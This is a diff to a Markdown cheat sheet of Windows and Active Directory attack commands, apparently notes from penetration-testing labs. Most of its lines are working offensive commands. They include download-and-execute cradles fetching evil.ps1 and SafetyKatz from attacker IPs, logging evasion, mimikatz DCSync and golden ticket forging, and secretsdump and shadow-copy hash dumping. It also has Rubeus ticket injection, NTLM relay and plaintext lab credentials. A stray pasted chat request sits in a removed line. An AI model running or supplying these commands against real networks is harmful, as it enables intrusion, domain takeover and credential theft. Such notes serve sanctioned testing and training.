@@ -242,7 +242,10 @@ Disable only what hurts us : 4103-Logs command invocation(module logging), 4104-
 `$snap.LogPipelineExecutionDetails = $false` Set ps-snapin execution details to false`
 
 ## File Transfer
+- **Netloader in-memory from a URL which then loads a binary from a filepath or URL**():
+`C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe`
 - **Download files using a Chrome User Agent:** `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` using a Chrome User Agent
+- **InternetExplorer Download:** `$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response`
 - **Run directly in memory:** `(New-Object System.NetWebClient).Downloadfile('http://') | IEX` 
 - **Download a file with Invoke-WebRequest:** `Invoke-WebRequest "http:///" -OutFile "kati.ps1"`
 - **Download a file with certutil:** `certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe`
@@ -284,41 +287,14 @@ olcSaslSecProps: noanonymous,minssf=0,passcred
 
 `psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe`
 
-# We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):
-winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
-
-# Load a PowerShell script using dot sourcing
-`. C:\AD\Tools\PowerView.ps1`
-
-# Download execute cradle
-`iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')`
-`$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response`
-
-`iex (iwr 'http://192.168.230.1/evil.ps1'
-
-`$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText`
-`$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
-$r = $wr.GetResponse()
-IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()`
-
-# (https://github.com/Flangvik/NetLoader) to deliver our binary payloads. It can be used to load binary from filepath or URL and patch AMSI & ETW while executing.
-`C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe`
-# We also have AssemblyLoad.exe that can be used to load the Netloader in-memory from a URL which then loads a binary from a filepath or URL.
-`C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe`
-
-# The ActiveDirectory PowerShell module (MS signed and works even in PowerShell CLM)
-https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps
-https://github.com/samratashok/ADModule
-`Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll`
-`Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1`
 
 - **Common code for the below tecniques**
-``$username = 'Administrator';`
+`$username = 'Administrator';`
 `$password = 'Mypass123';`
 `$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; `
 `$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;`
 
-`smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//OXIiis.za.NAI.com/admin$/' EZpass4ever` *Upload what you want to execute on the shares (depends on the method you choose)*
+- **Upload what you want to execute on the shares** `smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//OXIiis.za.NAI.com/admin$/' EZpass4ever` 
 
 - **WinRM remote exec(required: Remote Management Users group- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS))**
 `winrs.exe -u:Administrator -p:Mypass123 -r:target cmd` *One way*
@@ -553,13 +529,9 @@ dir \OXIrootdc.NAI.loc\c$\
 - **DC SYNC all** 
 `mimikatz # log syncemup_dcdump.txt `
 `mimikatz # lsadump::dcsync /domain:za.NAI.loc /all`*Get all username, hashes and etc*
-- **DC SYNC Alrternative of mimi(remote ofc)**
+- **DC SYNC Alrternative of mimi**
 `python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@MACHINE_IP`
 0x36c8d26ec0df8b23ce63bcefa6e2d821
-
-- **Forge tickets**
-` Get-ADDomain` *Get the domain SID*
-*All the other information can be found on a dc sync*
 
 - **Golden ticket**
 `mimikatz # kerberos::golden /admin:ALegitAccount /domain:za.NAI.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt`
@@ -569,7 +541,7 @@ dir \OXIrootdc.NAI.loc\c$\
 mimikatz # kerberos::golden /admin:ALegitAccount /domain:za.NAI.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
 ```
 
-- **Generating our own Certificates become CA and make them cry**
+- **Generating our own Certificates become CA**
 `mimikatz # crypto::certificates /systemstore:local_machine`
 `mimikatz # privilege::debug`
 `mimikatz # crypto::capi`
@@ -732,8 +704,7 @@ Right after you perform these steps, you will get an error that you can no longe
 
 ## Credential harvesting
 
-- **Dump local hashes, one way**
-- `Check powershell console history for credentials`
+
 - **Dump local hashes, one way**
 *cmd.exe prompt with administrator privileges*
 `wmic shadowcopy call create Volume='C:\'`*wmic command to create a copy shadow of C: drive*
@@ -997,12 +968,6 @@ password - The password associated with the svcIIS account.*
 `Rubeus.exe ptt /ticket:`
 - **Once the ticket is injected, run DCSync:**
 `Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`
-
-
-give me the output in one output text ( the black one you usuall use, becuase it's easy for copy and paste). This is how i want you to do it :   
-- **Setup NTLM relay:**
-  `python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"OXISERVER1 IP" -debug`
-
 
 ## CONSTRAINED DELEGATION 
 Constrained Delegation with Protocol Transition means The web service requests a ticket from the Key Distribution Center (KDC) for someones's account without supplying a password, as the websvc account. The KDC checks the websvc userAccountControl value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute, and that someones's account is not blocked for delegation. To abuse constrained delegation in above scenario, we need to have access to the websvc account. If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of the websvc account as ANY user.
